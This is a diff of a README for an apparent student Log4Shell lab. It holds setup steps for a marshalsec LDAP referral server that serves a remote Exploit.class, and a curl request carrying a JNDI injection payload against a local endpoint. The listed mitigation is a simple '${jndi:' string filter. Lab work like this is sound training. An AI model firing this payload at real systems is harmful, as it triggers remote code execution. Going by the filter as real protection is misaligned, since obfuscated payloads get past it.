@@ -13,43 +13,45 @@ HW9_Log4Shell/
 
 Setup Instructions (AWS Linux 2)
 1. Clone the Repo
-
+ ```shell
 git clone https://github.com/zilantix/HW9_Log4Shell.git
 cd HW9_Log4Shell
-
+ ```
 2. Run Setup Script *(Optional)*
-
+ ```shell
 chmod +x setup_log4shell_lab.py
 ./setup_log4shell_lab.py
-
+ ```
 
 3. Manually Start LDAP Exploit Infrastructure
-
+ ```shell
 cd marshalsec
 java -cp target/marshalsec-*-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<EC2-IP>:8000/#Exploit"
-
+ ```
 # In another terminal:
+ ```shell
 cd ~/exploit
 python3 -m http.server 8000
-
+ ```
 
 ---
 Exploit Testing
-
+ ```shell
 curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:1389/a}' http://localhost:8080/log
-
+ ```
 Confirm `GET /Exploit.class` in your HTTP server logs.
 ---
 
 Mitigation
 
 - Patched input via validation in `LogController.java`:
+ ```shell
 java
 if (input.contains("${jndi:")) {
     return "Invalid input detected";
 }
-
-- Can upgrade to Log4j 2.17.0 for full vendor patch
+ ```
+- upgrade/change pom.xml on to Log4j 2.17.0 for full vendor patch
 
 ---
 Incident Response (MITRE REACT)
